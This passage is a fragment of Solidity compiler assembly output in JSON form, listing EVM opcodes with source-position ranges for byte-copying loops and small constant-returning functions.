											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "tag",
											"source": 0,
											"value": "108"
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10060,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 10042,
											"end": 10083,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10102,
											"end": 10104,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "109"
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "tag",
											"source": 0,
											"value": "109"
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 10097,
											"end": 10104,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9999,
											"end": 10002,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9999,
											"end": 10002,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 9999,
											"end": 10002,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9999,
											"end": 10002,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9999,
											"end": 10002,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "tag",
											"source": 0,
											"value": "103"
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9975,
											"end": 10115,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10139,
											"end": 10142,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10125,
											"end": 10143,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 10125,
											"end": 10143,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10125,
											"end": 10143,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10125,
											"end": 10143,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10125,
											"end": 10143,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9728,
											"end": 10150,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9728,
											"end": 10150,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9728,
											"end": 10150,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9728,
											"end": 10150,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 16279,
											"end": 16890,
											"name": "tag",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 16279,
											"end": 16890,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16362,
											"end": 16375,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 16387,
											"end": 16410,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16419,
											"end": 16424,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 16387,
											"end": 16425,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16387,
											"end": 16425,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16435,
											"end": 16459,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 16468,
											"end": 16474,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 16435,
											"end": 16475,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16435,
											"end": 16475,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16486,
											"end": 16509,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 16543,
											"end": 16554,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16543,
											"end": 16561,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16523,
											"end": 16533,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 16523,
											"end": 16540,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16523,
											"end": 16561,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "111"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "111"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "112"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 21,
											"end": 27,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 17,
											"end": 31,
											"name": "MUL",
											"source": -1
										},
										{
											"begin": 124,
											"end": 128,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 108,
											"end": 122,
											"name": "CALLDATASIZE",
											"source": -1
										},
										{
											"begin": 100,
											"end": 106,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 87,
											"end": 129,
											"name": "CALLDATACOPY",
											"source": -1
										},
										{
											"begin": 155,
											"end": 159,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 147,
											"end": 153,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 143,
											"end": 160,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 133,
											"end": 160,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 133,
											"end": 160,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 164,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "tag",
											"source": 0,
											"value": "112"
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16512,
											"end": 16562,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16486,
											"end": 16562,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16486,
											"end": 16562,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16572,
											"end": 16594,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 16603,
											"end": 16612,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16572,
											"end": 16613,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16572,
											"end": 16613,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16624,
											"end": 16630,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16640,
											"end": 16646,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16663,
											"end": 16664,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16661,
											"end": 16664,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16661,
											"end": 16664,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "tag",
											"source": 0,
											"value": "113"
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16668,
											"end": 16678,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 16668,
											"end": 16685,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16666,
											"end": 16667,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16666,
											"end": 16685,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16733,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 16734,
											"end": 16735,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "116"
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "tag",
											"source": 0,
											"value": "116"
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 16723,
											"end": 16736,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16715,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 16716,
											"end": 16719,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16716,
											"end": 16719,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16716,
											"end": 16719,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 16716,
											"end": 16719,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16716,
											"end": 16719,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 16716,
											"end": 16719,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "117"
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "tag",
											"source": 0,
											"value": "117"
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16720,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 16706,
											"end": 16736,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16687,
											"end": 16690,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16687,
											"end": 16690,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16687,
											"end": 16690,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 16687,
											"end": 16690,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16687,
											"end": 16690,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 16687,
											"end": 16690,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16687,
											"end": 16690,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "113"
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "tag",
											"source": 0,
											"value": "114"
										},
										{
											"begin": 16657,
											"end": 16747,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16763,
											"end": 16764,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16761,
											"end": 16764,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16761,
											"end": 16764,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "tag",
											"source": 0,
											"value": "118"
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16768,
											"end": 16779,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 16768,
											"end": 16786,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16766,
											"end": 16767,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16766,
											"end": 16786,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "119"
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16835,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 16836,
											"end": 16837,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "121"
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "tag",
											"source": 0,
											"value": "121"
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "PUSH",
											"source": 0,
											"value": "F8"
										},
										{
											"begin": 16824,
											"end": 16838,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16816,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 16817,
											"end": 16820,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16817,
											"end": 16820,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16817,
											"end": 16820,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 16817,
											"end": 16820,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16817,
											"end": 16820,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 16817,
											"end": 16820,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "tag",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16821,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 16807,
											"end": 16838,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16788,
											"end": 16791,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 16788,
											"end": 16791,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 16788,
											"end": 16791,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 16788,
											"end": 16791,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 16788,
											"end": 16791,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 16788,
											"end": 16791,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16788,
											"end": 16791,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "118"
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "tag",
											"source": 0,
											"value": "119"
										},
										{
											"begin": 16757,
											"end": 16849,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16873,
											"end": 16882,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 16859,
											"end": 16883,
											"name": "SWAP7",
											"source": 0
										},
										{
											"begin": 16859,
											"end": 16883,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16859,
											"end": 16883,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16859,
											"end": 16883,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16859,
											"end": 16883,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16859,
											"end": 16883,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16859,
											"end": 16883,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16859,
											"end": 16883,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16279,
											"end": 16890,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 16279,
											"end": 16890,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 16279,
											"end": 16890,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16279,
											"end": 16890,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16279,
											"end": 16890,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 12716,
											"end": 12804,
											"name": "tag",
											"source": 0,
											"value": "59"
										},
										{
											"begin": 12716,
											"end": 12804,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12767,
											"end": 12771,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 12790,
											"end": 12797,
											"name": "PUSH",
											"source": 0,
											"value": "901082"
										},
										{
											"begin": 12783,
											"end": 12797,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12783,
											"end": 12797,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 12716,
											"end": 12804,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 12716,
											"end": 12804,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 15901,
											"end": 15987,
											"name": "tag",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 15901,
											"end": 15987,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15951,
											"end": 15955,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 15974,
											"end": 15980,
											"name": "PUSH",
											"source": 0,
											"value": "7CF51"
										},
										{
											"begin": 15967,
											"end": 15980,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15967,
											"end": 15980,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15901,
											"end": 15987,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15901,
											"end": 15987,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 14183,
											"end": 14502,
											"name": "tag",
											"source": 0,
											"value": "107"
										},
										{
											"begin": 14183,
											"end": 14502,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14235,
											"end": 14239,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14260,
											"end": 14261,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14255,
											"end": 14261,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 14255,
											"end": 14261,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14255,
											"end": 14256,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14255,
											"end": 14261,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 14255,
											"end": 14261,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14255,
											"end": 14271,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14255,
											"end": 14271,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14255,
											"end": 14271,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "126"
										},
										{
											"begin": 14255,
											"end": 14271,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 14255,
											"end": 14271,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14270,
											"end": 14271,
											"name": "PUSH",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 14265,
											"end": 14266,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14265,
											"end": 14271,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 14265,
											"end": 14271,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14265,
											"end": 14271,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 14265,
											"end": 14271,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14255,
											"end": 14271,
											"name": "tag",
											"source": 0,
											"value": "126"
										},
										{
											"begin": 14255,
											"end": 14271,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14251,
											"end": 14438,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14251,
											"end": 14438,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "127"
										},
										{
											"begin": 14251,
											"end": 14438,
											"name": "JUMPI",
